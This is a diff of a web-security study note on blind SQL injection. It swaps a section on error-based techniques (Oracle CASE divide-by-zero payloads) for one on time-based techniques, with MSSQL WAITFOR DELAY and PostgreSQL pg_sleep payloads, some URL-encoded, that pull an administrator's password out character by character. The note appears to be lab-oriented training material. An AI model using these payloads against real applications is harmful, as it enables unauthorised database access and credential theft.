@@ -70,53 +70,58 @@ This behavior is enough to be able to exploit the blind SQL injection vulnerabil
 > The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
 
 ---
-## Blind SQLi with conditional errors (Error based)
-> (Here when you get an error, that means your query was true)
+## Time-based Blind SQLi
+If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors ([[Error-based SQLi]]) will not work.
 
-Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in Boolean-based [[Blind SQLi]] won't work, because injecting different boolean conditions makes no difference to the application's responses.
+In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.
 
-It's often possible to induce the application to return a different response depending on whether a SQL error occurs. 
+The techniques for triggering a time delay are specific to the type of database being used. 
 
-You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.
-
-> [!example] Error-based blind SQLi
-> Suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
+> [!example] MsSQL Server example for Time-based SQLi
+> For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:
 > 
 > ```sql
-> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
-> xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+> '; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--
 > ```
 > 
-> These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:
-> 
-> - With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
-> - With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.
-> 
-> If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
-> 
-> Using this technique, you can retrieve data by testing one character at a time:
+> - The first of these inputs does not trigger a delay, because the condition `1=2` is false.
+> - The second input triggers a delay of 10 seconds, because the condition `1=1` is true.
+
+> [!example] MsSQL Server Get DB password using Time-based blind SQLi
+> Using this technique, we can retrieve data by testing one character at a time:
 > 
 > ```sql
-> xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+> '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 > ```
 
-> There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.
+> [!info]
+> There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.
 
-Next 2 examples are of Oracle DB:
+> [!attention] URL Encoding
+> Make sure to url encode your SQLi
 
-> [!important] Password Length Check
-> Checking for password length in DB using Error-based blind SQLi
+> [!important] Lab Time-based blind SQLi using PostgreSQL
+> Basic Test for time based blind SQLi:
 > ```sql
-> '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+> '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 > ```
-
-> [!important] Password Brute Force Checking
->  Checking first letter of password from a specific user
+> Web encoded version:
 > ```sql
-> '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+> '%3B+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
 > ```
-
-Check out [this video](https://youtu.be/HjXUtCKm1FM) by z3nsh3ll to learn more on conditional error based blind SQLi
-
+> 
+> Check if user exists:
+> ```sql
+> '; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+> ```
+> Web encoded version:
+> ```sql
+> '%3B+SELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--
+> ```
+> 
+> Test Password (Encoded version):
+> ```sql
+> '%3B+SELECT+CASE+WHEN+(SUBSTR(password,1,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator'--
+> ```
 
 #security/web/sql 
